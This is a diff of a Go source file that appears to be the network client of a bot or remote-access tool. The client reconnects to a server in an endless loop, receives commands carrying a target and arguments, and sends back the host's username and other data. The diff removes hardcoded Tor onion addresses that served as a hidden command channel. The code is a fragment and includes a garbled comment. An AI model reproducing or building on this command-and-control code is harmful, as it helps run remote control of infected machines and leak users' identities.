@@ -17,29 +17,16 @@ import (
 
 var c net.Conn //Global variable to send and receive from anywhere
 var ip string
-var torIp = []string{"tiked5bwdc5gov6y.onion.to:80", "tiked5bwdc5gov6y.onion.cab:80"}
 
-func ConnectCN() (net.Conn, error) {
+func Connect() (net.Conn, error) {
 	ip = GetIp()
 	_, err := net.Dial("tcp", ip)
 	if err != nil {
 		fmt.Println(err.Error())
 		Wait()
-		ConnectCN()
-	}
-	return net.Dial("tcp", ip)
-}
-
-func Connect() (net.Conn, error) {
-	fmt.Println("Trying to connect (tor)")
-	_, err := net.Dial("tcp", torIp[0])
-	if err != nil {
-		fmt.Println(err.Error())
-		Wait()
 		Connect()
 	}
-	fmt.Println("Valid con")
-	return net.Dial("tcp", torIp[0])
+	return net.Dial("tcp", ip)
 }
 
 func GetIp() string {
@@ -54,8 +41,7 @@ func Send(pre string, msg string) {
 	c.Write([]byte(pre + "|" + msg)) //var c is located in client.go
 }
 
-func ReciveCommand() network.Command {
-
+func ReciveCommand() (cmd string, target string, args string, date int64) {
 	msg, err := capnp.NewDecoder(c).Decode()
 	if err != nil {
 		panic(err)
@@ -67,7 +53,11 @@ func ReciveCommand() network.Command {
 	}
 
 	// Access fields from the struct.
-	return commad
+	cmd, _ = commad.Cmd()
+	target, _ = commad.Target()
+	args, _ = commad.Args()
+	date = commad.Date()
+	return
 }
 
 func SendData(data string) {
@@ -76,13 +66,15 @@ func SendData(data string) {
 		panic(err)
 	}
 
-	// Create a new Book struct.  Every message must have a root struct.
+	// Create a newclient. Book struct.  Every message must have a root struct.
 	cnp, err := network.NewRootCommand(seg)
 	if err != nil {
 		panic(err)
 	}
 	// id
 	cnp.SetCmd(GetUsername())
+	//Target blanc
+	cnp.SetTarget("")
 	// Data
 	cnp.SetArgs(data)
 	cnp.SetDate(time.Now().Unix()) // Set int date
@@ -100,5 +92,6 @@ func Receive() string {
 	if err != nil {
 		c, _ = Connect()
 	}
+
 	return status
 }
